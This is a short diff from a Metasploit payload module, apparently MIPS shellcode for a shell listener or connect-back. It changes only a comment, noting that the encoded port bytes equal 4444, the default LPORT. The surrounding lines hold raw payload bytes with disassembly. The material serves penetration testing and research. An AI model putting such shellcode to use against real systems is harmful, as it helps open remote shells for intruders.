@@ -58,7 +58,7 @@ module Metasploit3
     "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
     "\xef\xff\x0e\x24" + #     li      t6,-17                        ; t6: 0xffffffef
     "\x27\x70\xc0\x01" + #     nor     t6,t6,zero                    ; t6: 0x10 (16)
-    port.pack("C2") + "\x0d\x24" +  #     li      t5,0xFFFF (port)   ; t5: 0x5c11
+    port.pack("C2") + "\x0d\x24" +  #     li      t5,0xFFFF (port)   ; t5: 0x5c11 (0x115c == 4444 (default LPORT))
     "\x04\x68\xcd\x01" + #     sllv    t5,t5,t6                      ; t5: 0x5c110000
     "\xfd\xff\x0e\x24" + #     li      t6,-3                         ; t6: -3
     "\x27\x70\xc0\x01" + #     nor     t6,t6,zero                    ; t6: 0x2
